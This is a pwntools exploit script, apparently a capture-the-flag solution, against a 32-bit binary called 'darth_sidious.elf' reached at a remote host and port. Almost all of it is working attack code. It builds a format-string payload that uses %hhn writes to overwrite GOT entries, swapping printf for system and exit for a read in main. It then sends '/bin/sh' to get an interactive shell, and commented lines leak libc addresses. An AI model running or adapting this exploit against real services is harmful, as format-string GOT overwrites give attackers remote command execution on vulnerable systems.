#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('darth_sidious.elf')

host = args.HOST or '116.203.107.3'
port = int(args.PORT or 12037)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

io = start()
pause()
'''
Get got.plt addresses, reveal libc
and calculate LIBC_BASE address
'''
# pl = "%14$p-->" + p32(0x0804B364)
# io.sendline(pl)
# io.recvuntil(b'the increasing threats of the separatists.\n')
# addr = io.recvline()
# addr = u32(addr[:4])
# print( hex(addr) )

'''
Replace EXIT() with READ() (somewhere in main),
and PRINTF() with SYSTEM()
'''
# pre_read			08 04 92 2D
# system			f7 c4 c7 b0
# 0x04(e) 0x2d(e) 0x92(e) 0xb0(p) 0xc4(p) 0xc7(p) 
# exit_gotplt = p32(0x0804B364)
# printf_gotplt = p32(0x0804B35C)
pl = flat({
	0:		'%{}c%76$hhn%{}c%77$hhn%{}c%78$hhn%{}c%79$hhn%{}c%80$hhn%{}c%81$hhn'.format(
		0x04,
		0x2d-0x04,
		0x92-0x2d,
		0xb0-0x92,
		0xc4-0xb0,
		0xc7-0xc4
	).encode(),
	
	256:	[
		p32(0x0804B364+2),
		p32(0x0804B364),
		p32(0x0804B364+1),
		p32(0x0804B35C),
		p32(0x0804B35C+2),
		p32(0x0804B35C+1),
	]
})
io.sendline(pl)
io.sendline(b'/bin/sh')
io.interactive()